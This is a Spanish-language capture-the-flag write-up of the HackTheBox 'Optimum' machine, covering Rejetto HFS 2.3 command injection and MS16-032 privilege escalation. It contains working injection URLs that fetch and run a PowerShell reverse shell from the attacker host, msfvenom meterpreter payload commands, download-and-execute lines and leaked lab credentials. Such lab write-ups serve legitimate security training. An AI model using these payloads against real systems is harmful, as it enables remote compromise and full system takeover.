---
layout      : post
title       : "Optimum - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Optimum-HackTheBox/Optimum.webp
category    : [ htb ]
tags        : [ Windows ]
---

En esta ocasión resolveremos una máquina Windows de nivel Easy, tenemos un servidor web de transferencia de archivos y usaremos una herramienta nueva para descubrir vulnerabilidades para escalar privilegios en Windows.

![](/assets/images/HTB/Optimum-HackTheBox/rating-optimum.png)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)

# Reconocimiento de Puertos

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Solo tenemos el puerto 80 abierto... algo raro para ser una máquina windows y raro para ser un CTF de HackTheBox.

| Puerto | Servicio | Versión |
| ------ | -------- | ------- |
| 80     | HTTP     | HttpFileServer 2.3 |

Vamos a abrir el navgeador y a ver que tenemos.


![](/assets/images/HTB/Optimum-HackTheBox/web1.png)


Lo primero que encontramos es una web que al parecer sirve para subir archivos.

Tenemos un login y un campo para buscar los archivos.

Lo primero que voy a hacer es buscar vulnerabilidades existentes en el servidor.


```bash
❯ searchsploit HttpFileServer 2.3
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                | windows/webapps/49125.py
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Tenemos un exploit para la versión 2.3 de ejecución de comandos remotos, lo descargo.

Lo ejecuto con los siguientes parámetros:

![](/assets/images/HTB/Optimum-HackTheBox/exploit1.png)

Nos genera una url con la que podremos ejecutar los comandos, pero no funciona... al menos los típicos comandos como dir, ls , net user... etc

Asique intento probar algo para ver si realmente funciona, la idea es hacer un ping desde la máquina víctima a mi máquina a través del cmd.

``http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.14.3.}``

Para comprobar el funcionamiento abro wireshark y filtro el tráfico para ver solo paquetes ICMP.

*¡RECORDAR QUE DEBEMOS CAPTURAR EL TRÁFICO EN LA INTERFAZ tun0 (que es la de la VPN de HTB)!*

![](/assets/images/HTB/Optimum-HackTheBox/wireshark.png)


Como vemos funciona, tenemos ping.

Ahora debemos intentar entablar conexión... 

Buscando en internet encuentro una reverse shell para Windows 'Oneline'.

[https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)

![](/assets/images/HTB/Optimum-HackTheBox/rev.png)


En mi caso la guardo bajo el nombre de reverse.ps1

Ejecutamos un servidor python 

```python
python3 -m http.server 8080
```

Y añadimos el siguiente comando a la url del navegador para pasar el archivo reverse.ps1 a la máquina víctima y ejecutarlo.

```url
 http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.3/reverse.ps1').} 
 ```

Abrimos un oyente netcat en el puerto que hemos configurado en el archivo reverse.ps1 (en mi caso 4444).


![](/assets/images/HTB/Optimum-HackTheBox/rev2.png)

Una vez tenemos la conexión ya podemos leer la flag user


# Escalada de Privilegios

Primero enumero un poco la máquina lanzando systeminfo para ver ante que versión de Windows estamos 

```cmd
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ??
System Boot Time:          21/9/2022, 7:50:54 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.459 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.918 MB
Virtual Memory: In Use:    585 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```


A continaución lanzo winpeas a ver si me arroja algo de información valiosa.

Para subirlo a la máquina windows uso el servidor de python.

``python3 -m http.server 8080``

Y desde powershell

```powershell
 iwr -Uri http://10.10.14.3:8080/winPEASx64.exe -OutFile C:\ProgramData\winPEASX64.exe 
 ```

Una vez lo tenemos lo ejecutamos 

Y he encontrado unas credenciales --> kostas:kdeEjDowkS*

![](/assets/images/HTB/Optimum-HackTheBox/credencialeswinpeas.png)

Pero debemos buscar algo más, ya que no tenemos formas de escalar en este momento.

Buscando herramientas que busquen vulnerabilidades en el sistema Windows di con este post:

[https://vk9-sec.com/sherlock-find-missing-windows-patches-for-local-privilege-escalation/](https://vk9-sec.com/sherlock-find-missing-windows-patches-for-local-privilege-escalation/)

Sigo los pasos descargando el repositorio --> [https://github.com/rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock)


> Ejecutamos el servidor de python

`` python3 -m http.server 8080 ``

> Subimos y ejecutamos el Sherlock.ps1 con el comando:

`` powershell "iex(new-object net.webclient).downloadString('http://10.10.14.3:8080/Sherlock.ps1');Find-AllVulns" ``

> Encontramos 3 posibles Vulnerabilidades

```powershell
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Appears Vulnerable
```

Tenemos 3 posibles Vulnerabilidades, empezaré por la primera.

Buscando exploits encuentro lo siguiente:

```bash
❯ searchsploit ms16-032
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows 7 < 10 / 2008 < 2012 (x86/x64) - Local Privilege Escalation (MS16-032)                                                                   | windows/local/39809.cs
Microsoft Windows 7 < 10 / 2008 < 2012 (x86/x64) - Secondary Logon Handle Privilege Escalation (MS16-032) (Metasploit)                                     | windows/local/40107.rb
Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Local Privilege Escalation (MS16-032) (PowerShell)                                                   | windows/local/39719.ps1
Microsoft Windows 8.1/10 (x86) - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032)                                     | windows_x86/local/39574.cs
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
``` 

En mi caso descargo el .ps1 aunque también se puede hacer a través de metasploit.

Lo descargo y le echo un vistazo para ver el contenido del mismo.

Veo que está llamando al ejecutable cmd.exe, pero eso no nos sirve, debemos modificar el script añadiendo un archivo malicioso que crearemos con msfvenom.

![](/assets/images/HTB/Optimum-HackTheBox/exploit2.png)

Seguimos estos pasos:

> Creación del archivo malicioso con msfvenom

`` msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.3 lport=1234 -f exe -o malicioso.exe ``

> Subimos el malicioso a la máquina víctima.

Con el servidor python `` python3 -m http.server 8080 ``

Y en la máquina `` iwr -Uri http://10.10.14.3:8080/malicioso.exe -OutFile C:\Users\kostas\Desktop\malicioso.exe ``

> Editamos el script del exploit:

![](/assets/images/HTB/Optimum-HackTheBox/exploit3.png)

> Subimos el exploit a la máquina víctima

Con el servidor python `` python3 -m http.server 8080 ``

Y en la máquina `` iwr -Uri http://10.10.14.3:8080/39719.ps1 -OutFile C:\Users\kostas\Desktop\39719.ps1 ``

> Una vez subido nos abrimos metasploit

![](/assets/images/HTB/Optimum-HackTheBox/metasploit1.png)

> Ejecutamos el script 

`` Import-Module ./39719.ps1 ``

`` Invoke-MS16-032 ``

![](/assets/images/HTB/Optimum-HackTheBox/exploit4.png)

Recibiremos la conexión y ya seremos NT AUTHORITY\SYSTEM

![](/assets/images/HTB/Optimum-HackTheBox/root.png)


